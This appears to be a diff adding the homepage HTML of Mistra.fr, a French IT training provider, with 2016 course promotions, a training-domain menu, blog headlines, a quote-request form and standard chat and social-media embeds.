+	<h3>PROCHAINES FORMATIONS</h3>
+<h4><span>PROMOTION SUR NOS PROCHAINES FORMATION A -20% ET -30% </span></h4>
+<p><a href="/formations-developpement-logiciel/formation-python.html"><span>Formation Python django&nbsp;</span><br />6 au 9 Juin 2016 - 1000 euros HT</a></p>
+<p><a data-cke-saved-href="https://www.mistra.fr/formations-initiations/formation-conception-objet.html" href="/formations-developpement-mobile/formation-android.html"><span>Formation Android développement</span><br />9 au 13 Mai 2016 - 1450 euros HT</a></p>
+<p><a href="/formations-developpement-mobile/xamarin-pour-ios-et-android.html"><span>Formation Xamarin pour iOS et Android</span><br /> du 30 Mai &nbsp;au 3 Juin 2016 - 1900 euros HT</a></p>
+<p><a href="/formations-developpement-mobile/formation-swift.html"><span>Formation IOS avec Swift développement</span><br /> 9 au 13 Mai - 1900 euros HT</a></p>
+<p>&nbsp;</p>
+<p style="font-weight: bold;">Contactez nous pour toute inscription ou information</p>
+<p><img style="margin-left: 55px; margin-right: 10px;" alt="" src="/templates/mistra_new/images/icone-phone_03.png" /><span style="color: #761894; font-family: arial; font-weight: bold; font-size: 20px;">01 82 52 25 25</span><br /><br /><br /><br /><a style="display: block; padding-bottom: 10px;" href="/catalogue-des-formations/formations-promotions.html"><span style="color: #333131; font-size: 16px; margin-left: 10px;">Toutes nos promotions ...</span></a></p></div>
+		</div>
+	</div>
+        <div id="page" class="page container front-page">
+    <div id="leftWrapper" class="sidebar-tutoriel">
+        <div class="modules_wrapper">
+              
+              </div>
+        </div>
+      <div class="row content-page-index">
+        <div class="col-md-3">
+          <div class="kl_formation-sidebar formations-accueil">
+            		<div class="moduletable">
+					
+<div class="custom">
+	<h3>PROCHAINES FORMATIONS</h3>
+<h4><span>PROMOTION SUR NOS PROCHAINES FORMATION A -20% ET -30% </span></h4>
+<p><a href="/formations-developpement-logiciel/formation-python.html"><span>Formation Python django&nbsp;</span><br />6 au 9 Juin 2016 - 1000 euros HT</a></p>
+<p><a data-cke-saved-href="https://www.mistra.fr/formations-initiations/formation-conception-objet.html" href="/formations-developpement-mobile/formation-android.html"><span>Formation Android développement</span><br />9 au 13 Mai 2016 - 1450 euros HT</a></p>
+<p><a href="/formations-developpement-mobile/xamarin-pour-ios-et-android.html"><span>Formation Xamarin pour iOS et Android</span><br /> du 30 Mai &nbsp;au 3 Juin 2016 - 1900 euros HT</a></p>
+<p><a href="/formations-developpement-mobile/formation-swift.html"><span>Formation IOS avec Swift développement</span><br /> 9 au 13 Mai - 1900 euros HT</a></p>
+<p>&nbsp;</p>
+<p style="font-weight: bold;">Contactez nous pour toute inscription ou information</p>
+<p><img style="margin-left: 55px; margin-right: 10px;" alt="" src="/templates/mistra_new/images/icone-phone_03.png" /><span style="color: #761894; font-family: arial; font-weight: bold; font-size: 20px;">01 82 52 25 25</span><br /><br /><br /><br /><a style="display: block; padding-bottom: 10px;" href="/catalogue-des-formations/formations-promotions.html"><span style="color: #333131; font-size: 16px; margin-left: 10px;">Toutes nos promotions ...</span></a></p></div>
+		</div>
+	
+          </div>
+          <div class="kl_domaines_formations">
+            		<div class="moduletable">
+					<h3>Domaines de formations</h3>
+					
+<ul class="kl_nav nav navbar-nav menu nav menukl_nav_domaines" id="menu-menu_header">
+<li class="item-6717"><a href="/formations-initiations.html" >Initiation</a></li><li class="item-6718"><a href="/formations-java.html" >Java</a></li><li class="item-6719"><a href="/formations-dot-net.html" >.Net</a></li><li class="item-6720"><a href="/formations-developpement-web.html" >Développement web</a></li><li class="item-6721"><a href="/formations-developpement-logiciel.html" >Développement logiciel</a></li><li class="item-6722"><a href="/formations-developpement-mobile.html" >Développement mobile</a></li><li class="item-6723"><a href="/formations-cms.html" >CMS</a></li><li class="item-6724"><a href="/formations-bureautique.html" >Bureautique</a></li><li class="item-6725"><a href="/formations-pao.html" >PAO</a></li><li class="item-6726"><a href="/formations-linux.html" >Linux</a></li><li class="item-6727"><a href="/formations-serveurs-open-source.html" >Serveurs Open Source</a></li><li class="item-6728"><a href="/serveurs-microsoft.html" >Serveurs Microsoft</a></li><li class="item-6729"><a href="/formations-essentiel.html" >L'essentiel</a></li><li class="item-6730"><a href="/formations-cursus-metier.html" >Cursus métier</a></li><li class="item-6731"><a href="/formations-cursus-cours-du-soir.html" >Cursus cours du soir</a></li><li class="item-6732"><a href="/gestion-de-projet.html" >Gestion de projet</a></li><li class="item-6733"><a href="/photographie.html" >Photographie</a></li><li class="item-6734"><a href="/bigdata.html" >Big data</a></li><li class="item-6735"><a href="/univers-et-developpement-3d.html" >Univers et développement 3D</a></li></ul>
+		</div>
+	
+          </div>
+        </div>
+                <div class="col-md-9 bloc-formations">
+                  <h1><span class="elt-ico-formations"></span>Top des formations Mistra</h1>
+                    <div class="row kl_les_formations">
+                      		<div class="moduletable prochaines-formations">
+					<h3>Prochaines Formations</h3>
+					
+<div class="custom prochaines-formations">
+	<div class="col-xs-6 kl_listes"><a href="/formations-developpement-mobile/formation-web-mobiles-multi-plates-formes.html">
+<div class="kl_titre_formations_index pull-left">
+<h3>&nbsp;</h3>
+<h3>Formation&nbsp;Développement sites mobile<br /><span><br /></span></h3>
+</div>
+<div class="pull-right kl_prix">&nbsp;</div>
+</a></div>
+<div class="col-xs-6 kl_listes"><a href="/formations-developpement-web/formation-html-5-css3.html">
+<div class="kl_titre_formations_index pull-left">
+<h3>&nbsp;</h3>
+<h3>Formation HTML 5CSS 3<br /><span><br /></span></h3>
+</div>
+<div class="pull-right kl_prix">&nbsp;</div>
+</a></div>
+<div class="col-xs-6 kl_listes"><a href="/formations-initiations/formation-conception-objet.html">
+<div class="kl_titre_formations_index pull-left">
+<h3>Formation Conception orientée Objet<br /><span><br /></span></h3>
+</div>
+<div class="pull-right kl_prix">&nbsp;</div>
+</a></div>
+<div class="col-xs-6 kl_listes"><a href="/formations-developpement-logiciel/formation-python.html">
+<div class="kl_titre_formations_index pull-left">
+<h3>Formation Python bases développement<br /><span><br /></span></h3>
+<p>&nbsp;</p>
+</div>
+<div class="pull-right kl_prix">&nbsp;</div>
+</a></div>
+<div class="col-xs-6 kl_listes">
+<div class="kl_titre_formations_index pull-left">
+<h3>Formation Symfony 2 et 3<br /><span><br /></span></h3>
+<div class="kl_titre_formations_index pull-left" style="width: 373.25px;">
+<h3>Formation Xamarin pour iOS et Android&nbsp;</h3>
+<p>&nbsp;</p>
+</div>
+<p>&nbsp;</p>
+</div>
+<div class="pull-right kl_prix">&nbsp;</div>
+</div>
+<div class="col-xs-6 kl_listes">
+<div class="kl_titre_formations_index pull-left">
+<h3>Formation Java et frameworks<br /><br /></h3>
+<div class="kl_titre_formations_index pull-left" style="width: 373.25px;">
+<h3>Formation AngularJS</h3>
+<p>&nbsp;</p>
+</div>
+<p>&nbsp;</p>
+</div>
+<div class="pull-right kl_prix">&nbsp;</div>
+</div>
+<div class="col-xs-6 kl_listes"><a href="/formations-developpement-mobile/xamarin-pour-ios-et-android.html">
+<div class="kl_titre_formations_index pull-left">
+<h3><br /><span><br /></span></h3>
+</div>
+<div class="pull-right kl_prix">&nbsp;</div>
+</a></div></div>
+		</div>
+	
+                    </div>
+                </div>
+                        <div class="col-md-9 bloc-actus-mistra">
+                  <h1><a href="http://blog.mistra.fr" target="_blank"><span class="elt-actu-ico"></span>BLOG IT<span> MISTRA</span></a></h1>
+                   
+                    
+	<div style="direction: ltr; text-align: left ! important"  class="feed">
+			
+					<div class="col-xs-12">
+				<ul class="newsfeed">
+							<li class="newsfeed-item">
+									<h4 class="feed-link">
+				<a href="http://feedproxy.google.com/~r/MistraFormationBlog/~3/0UsCDCLQU60/powerpoint-embarque-designer-et-morph" target="_blank">
+					PowerPoint embarque Designer et Morph</a>
+					</h4>				
+						<p> Officie 2016 s’enrichit de nouveautés avec PowerPoint qui embarque des fonctionnalités innovantes&#8230;   PowerPoint Designer...</p>
+
+									</li>
+								<li class="newsfeed-item">
+									<h4 class="feed-link">
+				<a href="http://feedproxy.google.com/~r/MistraFormationBlog/~3/9zhc5q4wIDw/parlez-vous-caml" target="_blank">
+					Parlez-vous Caml ?</a>
+					</h4>				
+						<p> Caml est un langage de programmation généraliste, pour coder dans un style fonctionnel, impératif ou...</p>
+
+									</li>
+								<li class="newsfeed-item">
+									<h4 class="feed-link">
+				<a href="http://feedproxy.google.com/~r/MistraFormationBlog/~3/rigReKPZneo/onlyoffice-tous-azimuts" target="_blank">
+					OnlyOffice tous azimuts</a>
+					</h4>				
+						<p> Le portail OnlyOffice publie une application gratuite Documents 1.0 à destination des appareils iOS et...</p>
+
+									</li>
+							</ul>
+			</div>	
+	</div>
+
+                </div>
+              </div>
+    </div>
+        <div class="contenu-page">
+          <div class="blog-featured">
+
+
+
+
+</div>
+
+      
+<div id="system-message-container">
+</div>
+      <div class="kl_bloc_devis_form">
+        <a href="#" class="kl_close_popup">X</a>
+        
+    
+
+
+<!-- Plugin Include component version 1.13 by Mike Reumer
+     for: https://www.mistra.fr/index.php?option=com_aicontactsafe&view=message&layout=message&pf=4&redirect_on_success=&tmpl=component&print=1&origin=aHR0cHM6Ly93d3cubWlzdHJhLmZyLw== -->
+
+	
+<div id="system-message-container">
+</div>
+	<div class="aiContactSafe" id="aiContactSafe_mainbody_4">
+<div class="contentpaneopen">
+			<table id="aiContactSafeForm" border="0" cellpadding="0" cellspacing="5">
+				<tr>
+					<td valign="top"  >
+							<form action="https://www.mistra.fr/index.php?option=com_aicontactsafe" method="post" id="adminForm_4" name="adminForm_4" enctype="multipart/form-data">		<div id="displayAiContactSafeForm_4">
+				<div class="aiContactSafe" id="aiContactSafe_contact_form">
+				<div class="aiContactSafe" id="aiContactSafe_info"></div>
+										<div class="aiContactSafe_row" id="aiContactSafe_row_aics_name"><div class="aiContactSafe_contact_form_field_label_left"><span class="aiContactSafe_label" id="aiContactSafe_label_aics_name" ><label for="aics_name" >Nom</label></span>&nbsp;</div><div class="aiContactSafe_contact_form_field_right"><input type="text" name="aics_name" id="aics_name"  class='textbox' value="Nom" /></div>
+												</div>
+									<div class="aiContactSafe_row" id="aiContactSafe_row_aics_phone"><div class="aiContactSafe_contact_form_field_label_left"><span class="aiContactSafe_label" id="aiContactSafe_label_aics_phone" ><label for="aics_phone" >Téléphone</label></span>&nbsp;</div><div class="aiContactSafe_contact_form_field_right"><input type="text" name="aics_phone" id="aics_phone" maxlength="15" class='textbox' value="Téléphone" /></div>
+												</div>
+									<div class="aiContactSafe_row" id="aiContactSafe_row_aics_email"><div class="aiContactSafe_contact_form_field_label_left"><span class="aiContactSafe_label" id="aiContactSafe_label_aics_email" ><label for="aics_email" >Email</label></span>&nbsp;<label class="required_field"></label></div><div class="aiContactSafe_contact_form_field_right"><input type="text" name="aics_email" id="aics_email"  class='email' value="Email" /></div>
+												</div>
+									<div class="aiContactSafe_row" id="aiContactSafe_row_aics_Socit"><div class="aiContactSafe_contact_form_field_label_left"><span class="aiContactSafe_label" id="aiContactSafe_label_aics_Socit" ><label for="aics_Socit" >Société</label></span>&nbsp;</div><div class="aiContactSafe_contact_form_field_right"><input type="text" name="aics_Socit" id="aics_Socit"   value="Société" /></div>
+												</div>
+									<div class="aiContactSafe_row" id="aiContactSafe_row_aics_message"><div class="aiContactSafe_contact_form_field_label_left"><span class="aiContactSafe_label" id="aiContactSafe_label_aics_message" ><label for="aics_message" >Remarques</label></span>&nbsp;</div><div class="aiContactSafe_contact_form_field_right"><textarea name="aics_message" id="aics_message" cols="40" rows="10" class='editbox' onkeydown="checkEditboxLimit(4,'aics_message', 500)" onkeyup="checkEditboxLimit(4,'aics_message',500)" onchange="checkEditboxLimit(4,'aics_message',500)"></textarea><br /><div class="countdown_div">You have<input type="text" readonly="readonly" class="countdown_editbox" name="countdown_aics_message" id="countdown_aics_message" size="3" value="500" />characters left.</div></div>
+												</div>
+								<div class="aiContactSafe_row_hidden" id="aiContactSafe_row_aics_Formations_"><div class="aiContactSafe_contact_form_field_right"><input type="hidden" name="aics_Formations_" id="aics_Formations_"  value="" /></div></div>
+					</div>
+					</div>
+			<br clear="all" />
+						<br clear="all" />
+			<div id="aiContactSafeBtns"><div id="aiContactSafeButtons_center" style="clear:both; display:block; text-align:center;"><table border="0" cellpadding="2" cellspacing="0" style="margin-left:auto; margin-right:auto;"><tr><td><div id="aiContactSafeSend_loading_4">&nbsp;</div></td><td id="td_aiContactSafeSendButton"><input type="submit" id="aiContactSafeSendButton" value="Envoyer" /></td></tr></table></div></div>
+			<br clear="all" />
+		<input type="hidden" id="option" name="option" value="com_aicontactsafe" /><input type="hidden" id="sTask" name="sTask" value="message" /><input type="hidden" id="task" name="task" value="display" /><input type="hidden" id="send_mail" name="send_mail" value="1" /><input type="hidden" id="pf" name="pf" value="4" /><input type="hidden" id="return_to" name="return_to" value="https://www.mistra.fr/demande-de-devis-envoye.html" /><input type="hidden" id="current_url" name="current_url" value="https://www.mistra.fr/index.php?option=com_aicontactsafe&#38;view=message&#38;layout=message&#38;pf=4&#38;redirect_on_success=&#38;tmpl=component&#38;print=1&#38;origin=aHR0cHM6Ly93d3cubWlzdHJhLmZyLw==16060134dc79afb2c0dfec9c4ff2c048=fik7o8d6n5q7ovbaarj35o7hn4" /><input type="hidden" id="Itemid" name="Itemid" value="0" /><input type="hidden" id="lang" name="lang" value="en" /><input type="hidden" id="back_button" name="back_button" value="0" /><input type="hidden" id="boxchecked" name="boxchecked" value="0" /><input type="hidden" id="use_ajax" name="use_ajax" value="0" /><input type="hidden" id="r_id" name="r_id" value="2098959503" /><input type="hidden" name="9b13772c7a46223ec2bbfa5417edb6b9" value="1" /></form>						</td>
+				</tr>
+				<tr><td valign="top"  ><script type="text/javascript">
+var html = '<h2>Demande de devis</h2><p>Remplissez ce formulaire afin de recevoir un devis pour cette formation.</p><table border="0"><tbody><tr><td width="100px">Formation :</td><td id="urlCurrentTrainingPage"></td></tr></tbody></table>';
+
+$("#adminForm_4").children().first().before( html );
+
+document.getElementById('urlCurrentTrainingPage').innerHTML = "<a href='"+ parent.document.URL +"' target='_blank'>"+ parent.document.URL +"</a>";
+
+$("#aics_Formations_").val( parent.document.URL );
+
+</script></td></tr>
+			</table>
+	</div>
+</div>
+
+<!-- End Plugin Include component -->
+      </div>
+        </div>
+        <div id="footer" class="footer">
+      <!--<div class="kl_mylive_chat">		<div class="moduletable">
+					
+		<div class="mod_mylivechat">
+	<script type="text/javascript" src="https://www.mylivechat.com/chatinline.aspx?hccid=54969420"></script>	
+		</div>
+			</div>
+	</div>-->
+      <div class="kl_chat_final">
+        <!-- begin SnapEngage code -->
+        <script type="text/javascript">
+          (function() {
+          var se = document.createElement('script'); se.type = 'text/javascript'; se.async = true;
+          se.src = '//storage.googleapis.com/code.snapengage.com/js/efb59e5f-978f-4879-a84e-a4c752d1d16e.js';
+          var done = false;
+          se.onload = se.onreadystatechange = function() {
+            if (!done&&(!this.readyState||this.readyState==='loaded'||this.readyState==='complete')) {
+            done = true;
+            /* Place your SnapEngage JS API code below */
+            /* SnapEngage.allowChatSound(true); Example JS API: Enable sounds for Visitors. */
+            }
+          };
+          var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(se, s);
+          })();
+        </script>
+        <!-- end SnapEngage code -->
+      </div>
+          <div class="container">
+                <div class="row">
+                    <div class="col-md-4 foot-1">
+                      <h2>Suivez nous sur twitter</h2>
+                        		<div class="moduletable">
+					<h3>Suivez-nous sur Twitter</h3>
+					
+<div class="custom">
+	<!-- <a href="http://twitter.com/MistraFormation" class="twitter-follow-button" data-show-count="false" data-lang="fr" data-link-color="800080" data-width="200px">Follow @MistraFormation</a>
+<script src="http://platform.twitter.com/widgets.js" data-mce-type="text/javascript">&nbsp;</script> -->
+<p><a class="twitter-timeline" href="https://twitter.com/MistraFormation" data-widget-id="350558814673719296">Tweets de @MistraFormation</a>
+</p>
+<script type="text/javascript">
+	// <![CDATA[
+	!
+	function(d, s, id) {
+		var js, fjs = d.getElementsByTagName(s)[0],
+			p = /^http:/.test(d.location) ? 'http' : 'https';
+		if (!d.getElementById(id)) {
+			js = d.createElement(s);
+			js.id = id;
+			js.src = p + "://platform.twitter.com/widgets.js";
+			fjs.parentNode.insertBefore(js, fjs);
+		}
+	}(document, "script", "twitter-wjs");
+	// ]]>
+	
+</script></div>
+		</div>
+	
+                    </div>
+                    <div class="col-md-5 foot-2">
+                      <h2>Acces direct</h2>
+                        <!--ICI LIEN FOOTER-->
+                       		<div class="moduletable">
+					
+<div class="custom">
+	<ul>
+	<li><a href="/catalogue-des-formations.html">Formation Mistra</a></li>
+	<li><a href="http://formateurs.matelli.fr" target="_blank">Délégation de formateurs</a></li>
+	<li><a href="/accueil-tutoriels.html">Tutoriels Mistra</a></li>
+	<li><a href="http://www.matelli-services.fr" target="_blank">Création d'applications sur mesure</a></li>
+	<li><a href="https://blog.mistra.fr/" target="_blank">Actualité IT</a></li>
+	<li><a href="http://www.mistra.fr" target="_blank">Formations en informatique</a></li>
+	<li><a href="/tutoriels-web/tutoriels-ria/tutoriel-flex-actionscript.html">Tutoriels sur flex</a></li>
+	<li><a href="/mentions-legales.html">Mentions légales</a></li>
+	<li><a href="/tutoriels-web/tutoriels-html5-css3.html">Tutoriels HTML5</a></li>
+</ul></div>
+		</div>
+	
+                        <div class="clearfix"></div>
+                    </div>
+                    <div class="col-md-3 foot-3">
+                      <h2>Restez connect&eacute;</h2>
+                        
+<div class="custom">
+	<iframe src="//www.facebook.com/plugins/likebox.php?href=https%3A%2F%2Fwww.facebook.com%2FMistraFormation%3Ffref%3Dts&amp;width=220&amp;height=290&amp;colorscheme=light&amp;show_faces=true&amp;header=true&amp;stream=false&amp;show_border=true&amp;appId=249405391900358" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:220px; height:290px;" allowTransparency="true"></iframe></div>
+
+                    </div>
+                </div>
+               <div class="kl_copyright">		<div class="moduletable">
+					
+<div class="custom">
+	<p>Copyright © 2015 Mistra.fr - Tous droits réservés</p></div>
+		</div>
+	</div>
+            </div>
+        </div>
+    </div>
+  </body>
+</html>
